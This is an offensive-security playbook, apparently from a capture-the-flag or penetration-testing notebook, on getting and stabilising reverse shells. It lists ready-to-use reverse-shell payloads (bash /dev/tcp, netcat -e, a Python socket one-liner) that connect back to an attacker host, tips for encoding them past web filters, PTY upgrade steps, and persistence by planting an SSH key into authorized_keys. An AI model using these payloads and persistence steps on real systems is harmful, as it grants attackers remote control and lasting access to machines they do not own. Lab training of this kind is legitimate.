# Playbook — Reverse Shells & Shell Stabilization

**Trigger:** you have code execution and need an interactive, stable shell.

## Get the shell
- Listener: `nc -lvnp 4444` (or `rlwrap nc -lvnp 4444` for line editing / history).
- Common payloads (set `LHOST`=tun0 IP):
  - bash: `bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'`
  - `nc LHOST 4444 -e /bin/bash` / mkfifo variant if `-e` unsupported.
  - python: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash"])'`
- URL-encode payloads passed through web params; base64-wrap if the sink filters characters.

## Stabilize to a real PTY
```
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or python
export TERM=xterm
Ctrl-Z ; stty raw -echo; fg ; [Enter]            # on the local kali side
```
`sudo` needs a TTY — you must upgrade before `sudo -l` works.

## ⚠ PTY paste-corruption (important, learned on Connected)
A raw reverse-shell PTY often **wraps long pasted lines and injects newlines**, corrupting the command (base64 blobs, `authorized_keys`, long one-liners break).
- **Keep pasted commands short.** Break multi-step commands into separate short lines.
- **Transfer data via HTTP, not paste:** on Kali `cd /tmp && python3 -m http.server 8000`; on target `curl -s http://LHOST:8000/file -o dest`.
- If you must move a key/blob, base64 it and pipe through `base64 -d` — but even base64 wraps if long, so prefer the curl method.

## Upgrade to stable SSH (do this early)
If you can write the target user's home:
```
# target (short commands only):
install -d -m700 ~/.ssh
curl -s http://LHOST:8000/id_ed25519.pub -o ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
restorecon -Rv ~/.ssh      # CentOS/SELinux: else sshd ignores the key
```
Then `ssh -i ~/.ssh/id_ed25519 user@target`. **SELinux gotcha:** a key dropped by a web/cron process may get the wrong context (`user_home_t`); `restorecon`/`chcon -t ssh_home_t` fixes it.

→ back to `../Machines/machines-methodology.md` Phase 2/3.
